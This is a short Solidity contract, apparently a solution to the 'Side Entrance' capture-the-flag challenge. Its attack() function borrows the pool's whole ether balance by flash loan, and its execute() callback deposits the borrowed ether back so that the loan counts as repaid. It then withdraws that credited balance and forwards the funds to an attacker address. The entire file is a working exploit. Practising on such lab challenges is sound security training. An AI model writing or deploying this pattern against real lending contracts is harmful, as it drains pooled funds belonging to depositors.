pragma solidity ^0.8.7;


import "./SideEntranceLenderPool.sol";


contract SideAttack is IFlashLoanEtherReceiver{
    address pool;
    address payable attacker;
    uint targetAmount;
    constructor(address poolAddress,address payable attackerAddress) public{
        pool = poolAddress;
        attacker = attackerAddress;

    }
    function attack() external {
        SideEntranceLenderPool target = SideEntranceLenderPool(pool);
        targetAmount = address(target).balance;
        target.flashLoan(address(target).balance);
        target.withdraw();
        attacker.call{value:targetAmount}("");
    }
    function execute() external payable override {
        SideEntranceLenderPool target = SideEntranceLenderPool(pool);
        target.deposit{value:targetAmount}();
    }

    receive() external payable{

    }

}   